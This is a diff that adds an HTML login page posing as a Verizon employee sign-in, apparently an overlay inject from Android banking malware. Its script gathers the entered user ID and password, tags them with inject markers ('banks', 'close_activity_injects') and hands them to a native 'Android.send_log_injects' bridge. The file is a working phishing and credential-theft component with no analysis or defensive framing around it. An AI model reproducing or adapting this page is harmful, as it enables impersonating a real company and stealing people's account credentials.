@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <title>Document</title>
+<style>
+    form{
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+    }
+    section{
+        padding: 23px;
+        flex: 1;
+    }
+
+    .input {
+            width: 100%;
+            padding:8px 4px;
+            border: 0;
+            background-color:  #fff;
+            margin-bottom: 15px;
+            border: 1px solid #e5e6e6;
+            border-bottom:1px solid #555555;
+    }
+        .login {
+            background-size: 15px;
+            background-repeat: no-repeat;
+            background-position: right 13px center;
+    }
+
+        .input:focus {
+            border:1px solid #555555;
+    }
+
+        input::placeholder {
+            color: #919191;
+            font-weight: 600;
+    }
+
+        input,button {
+            outline: none !important;
+            box-shadow: none !important;
+    }
+        .button {
+        display: block;
+        margin: auto;
+        padding: 10px;
+        border: 0;
+        background-color: #000;
+        color: #c7c8c8;
+        font-weight: 700;
+        margin-bottom: 15px;
+        border-radius: 5px;
+        width: 39%;
+        border-radius: 24px;
+    }
+
+    .button:disabled {
+        background-color: #747676;
+    }
+
+    .error {
+        border-color: #f00 !important;
+    }
+</style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAtAAAABVCAIAAADv10SJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyNpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ4IDc5LjE2NDAzNiwgMjAxOS8wOC8xMy0wMTowNjo1NyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIxLjAgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjg3NUE1QUI5RjI0NzExRUM5MDI0Qjg5NTU4MTI2MDg5IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjg3NUE1QUJBRjI0NzExRUM5MDI0Qjg5NTU4MTI2MDg5Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6ODc1QTVBQjdGMjQ3MTFFQzkwMjRCODk1NTgxMjYwODkiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6ODc1QTVBQjhGMjQ3MTFFQzkwMjRCODk1NTgxMjYwODkiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz59pnvQAAAIsUlEQVR42uzda0hUzQPHcXXdrdSSLlYg9cIEMwWtFIxCE6K8dbF1S4TuVkRZGBRhEVQE1QulG0FeSnyR3bTSykSCbiBBRVmp3a2M2sRarAQ19z94/s9wOGtPXndXn+/nRc3Ozq6HHWb2N3PO7rparVYXAACA/uTGSwAAAAgcAACAwAEAAEDgAAAABA4AAEDgAAAAIHAAAAACBwAAAIEDAAAQOAAAAIEDAACAwAEAAAgcAACAwAEAAEDgAAAABA4AAAACBwAAIHAAAAACBwAAgFMHDqvVyqsPAACBo3+5urp2mjza29vpFQAACBz9lTyE1tbW8+fPP3jwgI4BAIDA0fesVqtIG0VFRQ8fPqyqqvr9+zd9A3R3EHFIAJyWu5McR1tbm5I2goKCkpOTdTqdes5S74IA6JQTDhNGLgDHBw51jJB7GyEhIUlJSQaDgTkL6OWwAgCn4viLRmXamDZtmslk0qQNF3ZlgYG5o9DY2Oj6Dx8fH3oHIHA4kjyTEh4ebjQa9Xo9OQPojSlTpsi3+Xv37jnwSNRDuNPhzBgH/lMceQ2H3NuIiIhYsGCB+roN9VqNLWJgQNCc0PlT2bay0zNBnB4CCBx9MBmJstzbmDlzZnx8vCZtAHCq9NAVmvZDhw7Nzs5WyranSv/lgepKYgdA4Og29awh00ZkZGRsbKybG9+wDjhXkui0Tbfe/j08PFJTU3t5eKQNYNBwwDu9PJMSHR0t0gYTCmBPtiOusbHx9OnTiYmJAQEBI0eOjIqKysjIECPU9hoL8djm5uaCgoKYmJjRo0dPmjRp48aNtbW1lZWV8sKRo0ePKo0tFousFC3lk9TV1cn6LVu2iJrbt2+npKT4+vr6+PiYTKYbN278KYvQfcDAXu7YU0tLS2Fh4fbt28vLy9vb25VKWQDQS4GBgXJ0371796/ty8rKxowZ0+nksHXr1qamJnVjs9k8Z84cTTODwXD8+HF58/Dhw0rj79+/y0o/Pz/5JO/evZP1mzdvzsnJsf3Tx44doyuBQcauOxxyb2PevHli2uKyUMCxrl+/HhMT09DQoNwUyWPy5Mny3szMzFWrVrW1tSkrE7Ew2LBhQ0VFheZJxCoiLS2tZwdw586ddevW2dZv2rTp1atXdBAwmNgvcIi0cfHiRZE24uLioqOjCRmAY339+jUlJeX/E4Gbm1gMfP78ubq6+uXLlzNmzFDqL1y4kJ+fr6wKbt68KYawUj98+PDi4mKz2fz27dt9+/ZpfnOx6+c+Hj16JJ750KFDJSUle/fuVU8LZWVl9BEwmNjvolGLxfL69Wu9Xh8QEKD5qVjCB2B/ly5dkmc9MjIyEhMTlbK/v/+JEydCQ0OVm1lZWStXrtTpdCITyMfm5uYuWrTIpWNTZNeuXR8+fDh58qS8t1sjWhxGQkKCKIh/DQbDjh07lPoXL15oWvKJFYAdji4RE1NqaqqHh4eYqj59+iQnJvnhNzoDsKfS0lJZNplM6rtCQkKioqKU8rNnz968eSMKlZWVskFsbKw6WyxdurTH00J8fLy8GRkZKcs/f/7UNCZtAASOv5BhYty4cWvWrBGzhsgcHz9+ZJMDcKCqqipZ9vX11dwbFBQky8oKQV5UIVKCl5eXJjf07BhCQ0PVY18sSOgXgMDRc+oJRckcOp0uJyenrq6OqAHYM/T35iETJ05UCg0NDb9+/VLf1djY2PvJAQCBo48pmcNgMOTl5SlbtQDsFvql4OBgWZY7jtLz589lefz48S4duxGyRvNZlaKiIvtHIgAEjr9PKErmGDJkiMgcfPgNcIi4uDhZPnv2rHqcPnny5NatW0pNUFCQv7+/KCQlJcn2a9euLS0t/fbtW319fVZWlvyyr76NRAAGE8d8tbnMHLm5uadOnVq+fHlAQACdAfSt7Ozs8vJy2/qEhITw8PDFixdv27btx48foubAgQMhISGiRq/X19TUrF+/XjZOT0/X6XQiiMydO3f+/PnKZ1XMZrMo8woDcMbAIcnPtimZIy8vLz8/f9myZepvSATQe8pXaNgSYy0sLGzs2LFnzpxRcoMYlcnJycOGDRs1alR9fb1saTKZVqxYoZRFFsnJyRFDVRNiRBzJzMxUvqQcAP7EAddwaK4hXb16tZeXV0FBwdOnT+kPwJ7DMCEh4erVqyJkKJXNzc3qtJGWlibWA+7u7rK9yChXrlwpLCxcuHDh+A5i/D5+/Fh9eQcAdMrd4Ucgz62IzCHWWFOnTqVXALuJi4urra29fPlySUlJdXW12WwODg6eNWuW0WgMCwuzbW8wGJZ2UFdeu3ZNlj09PTv9Q8rWJheHAv/ddY6TjP8vX76IzGGxWJYsWTJ9+vROpyp6C3Cg3x2Usl6vVw/JgwcPym8IVX6fhZcLgIabkxyHss/h7e197ty5+/fva2MRaQPogn5dPxw5cmTIP/bv39/S0iIq29vbKyoqdu/erbQxGAwRERH2PzYAzs8pdjjkBoayzzFhwoSUlBSdTkf3AP2XS5QTHF1P8/X19YGBgU1NTcpNT09PPz+/mpqa1tZW2SYzMzM9Pb1PZgMABI7+1dDQMGLECLFOom+A/n6r7u5DKisrjUaj/C0kjZ07d+7Zs+dflgq2f64rNaQQgMDh1DMpgP4YaBaLpbi4uLy8XISP9+/fe3t7BwYGzp49WwQR9RXfjFkAAyNwMFsBgya4MJwBuDjPRaPaHMT0BDgiKPTt+FVfLOLSR78hB2CA4mPxAACg37nxEgAAAAIHAAAgcAAAABA4AAAAgQMAABA4AAAACBwAAIDAAQAAQOAAAAAEDgAAQOAAAAAgcAAAAAIHAAAgcAAAABA4AAAAgQMAAIDAAQAACBwAAIDAAQAAQOAAAAAEDgAAQOAAAAAgcAAAAAIHAAAAgQMAABA4AAAAgQMAAIDAAQAACBwAAIDAAQAAQOAAAAADhXtzc7P4z2q1yipXV1deFwAA0GO2ueJ/AgwA6IkZI5Izje4AAAAASUVORK5CYII=">
+            <h4 style="font-size: 23px;padding: 23px;font-weight: 700;margin-bottom: -31px;">
+                Login to your Verizon
+                employee account.
+            </h4>
+            <p style="font-size: 16px;padding: 23px; margin-bottom: -30px;">
+                Just complete a couple steps and you will be
+                in the employee experience.
+            </p>
+        </header>
+        <section>
+            <p>
+
+            </p>
+           
+                <p style="color: #000;font-weight: 500;font-size: 13px;position: relative;top: 13px;">
+                    User ID
+                </p>
+                <input type="text" inputmode="numeric" id="login" name="login" class="input login" placeholder="" autocomplete="off">
+                <p style="color: #000;font-weight: 500;font-size: 13px;position: relative;top: 13px;">
+                    Password
+                </p>
+                <input type="password" id="password" name="password" class="input password" placeholder="">
+    
+                
+           
+
+        </section>
+        <footer>
+            <input type="submit" class="button" id="sendData" disabled value="Login">
+        </footer>
+    </form>
+<script>
+    var login = document.getElementById('login'),
+        password = document.getElementById('password');
+        
+    var sendData = document.getElementById('sendData');
+        
+    function check() {
+        if(login.value.length >= 4 && password.value.length >= 4) {
+            sendData.disabled = false;
+        } else {
+            sendData.disabled = true;
+        }
+    }
+
+    login.onkeyup = () => {
+        check();
+    }
+
+    password.onkeyup = () => {
+        check();
+    }
+
+        sendData.onclick = () => {
+            var data = {};
+            data.login = login.value;
+            data.password = password.value;
+            data.type_injects = "banks";
+            data.closed = "close_activity_injects";
+
+            var ua = navigator.userAgent.toLowerCase();
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+        }
+</script>
+</body>
+</html>
